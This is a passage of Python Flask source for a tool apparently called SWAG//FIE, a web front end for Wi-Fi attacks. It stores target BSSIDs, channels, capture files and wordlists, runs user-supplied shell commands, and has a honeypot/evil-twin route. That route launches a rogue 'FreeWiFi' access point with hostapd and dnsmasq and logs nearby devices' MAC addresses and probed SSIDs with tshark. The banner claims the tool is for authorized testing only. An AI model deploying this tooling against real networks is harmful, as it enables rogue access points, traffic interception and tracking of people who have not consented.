    errs = []
    if d.get("bssid") and not valid_bssid(d["bssid"]): errs.append("BSSID invalid.")
    if d.get("ch") and not valid_ch(d["ch"]): errs.append("Channel must be 1-196.")
    if errs: return jsonify({"ok": False, "error": "; ".join(errs)}), 400
    for k in ("iface","bssid","ch","cap","wl"):
        if k in d: SERVER_CTX[k] = d[k]
    return jsonify({"ok": True, "ctx": SERVER_CTX})

@app.route("/api/psk")
def api_psk():
    return jsonify({"psk": secrets.token_urlsafe(18)})

def _fill(cmd, c):
    return (cmd.replace("{IFACE}", c.get("iface","")).replace("{BSSID}", c.get("bssid",""))
               .replace("{CH}", str(c.get("ch",""))).replace("{CAP}", c.get("cap",""))
               .replace("{WL}", c.get("wl","")))

def _validate(cmd, c):
    if "{BSSID}" in cmd and not valid_bssid(c.get("bssid","")):
        return "Invalid/missing BSSID."
    if "{CH}" in cmd and not valid_ch(str(c.get("ch",""))):
        return "Invalid/missing channel (1-196)."
    if "{CAP}" in cmd and c.get("cap") and not os.path.exists(c["cap"]):
        return f"Capture not found: {c['cap']}"
    if "{WL}" in cmd and c.get("wl") and not os.path.exists(c["wl"]):
        return f"Wordlist not found: {c['wl']}"
    return None

@app.route("/api/run", methods=["POST"])
def api_run():
    d = request.get_json(force=True, silent=True) or {}
    cmd = d.get("cmd","").strip(); kind = d.get("kind","scan")
    ctx = d.get("ctx") or SERVER_CTX
    if not cmd: return jsonify({"error": "Empty command"}), 400
    if kind == "attack" and not d.get("authorized"):
        return jsonify({"error": "Authorization not confirmed"}), 403
    err = _validate(cmd, ctx)
    if err: return jsonify({"error": err}), 400
    return jsonify({"job_id": JOBS.start(_fill(cmd, ctx))})

@app.route("/api/stream/<jid>")
def api_stream(jid):
    return Response(JOBS.stream(jid), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})

@app.route("/api/jobs")
def api_jobs(): return jsonify({"jobs": JOBS.list_jobs()})

@app.route("/api/kill/<jid>", methods=["POST"])
def api_kill(jid): return jsonify({"ok": JOBS.kill(jid)})

@app.route("/api/killall", methods=["POST"])
def api_killall(): JOBS.kill_all(); return jsonify({"ok": True})

@app.route("/api/honeypot", methods=["POST"])
def api_honeypot():
    d = request.get_json(force=True, silent=True) or {}
    if not d.get("authorized"): return jsonify({"error": "Authorization not confirmed"}), 403
    iface = (d.get("iface") or "wlan0").strip()
    ssid  = (d.get("ssid") or "FreeWiFi").strip()
    ch    = str(d.get("ch") or "6").strip()
    logf  = d.get("log") or os.path.join(BASE_DIR, "wifi-honeypot.log")
    mode  = d.get("mode", "hp")
    if not valid_ch(ch): return jsonify({"error": "Invalid channel"}), 400
    if mode == "hp":
        conf = write_hostapd(iface, ssid, ch, "/tmp/hp.conf")
        cmd = (f"hostapd {conf} >/tmp/hp.log 2>&1 & sleep 2 && "
               f"tshark -i {iface} -Y 'wlan.fc.type_subtype==4 or wlan.fc.type_subtype==0' "
               f"-T fields -e frame.time -e wlan.sa -e wlan.ssid >> {logf}")
    else:
        conf = write_hostapd(iface, ssid, ch, "/tmp/et.conf")
        dns  = write_dnsmasq("/tmp/et-dns.conf")
        cmd = (f"ip link add at0 type dummy 2>/dev/null; "
               f"hostapd {conf} >/tmp/et.log 2>&1 & sleep 2 && dnsmasq -C {dns} -d >/tmp/dns.log 2>&1")
    return jsonify({"job_id": JOBS.start(cmd)})

# ─────────────────────────── MAIN ───────────────────────────
if __name__ == "__main__":
    print("+--------------------------------------------------+")
    print("|  SWAG//FIE v5.2  -  http://127.0.0.1:5000        |")
    print("|  Made by Heaven Swag  -  Authorized testing only |")
    print("+--------------------------------------------------+")
    print(f"[i] Log:        {LOG_PATH}")
    print(f"[i] Android:    {IS_ANDROID}")
    print(f"[i] Root:       {IS_ROOT}")
    print(f"[i] Demo mode:  {DEMO_MODE}")
    if MISSING_TOOLS: print(f"[!] Missing:    {' '.join(MISSING_TOOLS)}")
    try:
        app.run(host=HOST, port=PORT, debug=False, threaded=True)
    except KeyboardInterrupt:
        print("\n[!] Aborted."); JOBS.kill_all()
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"[!] Port {PORT} busy. Try: SWAGFIE_PORT=5001 python3 swagfie.py")
        else: raise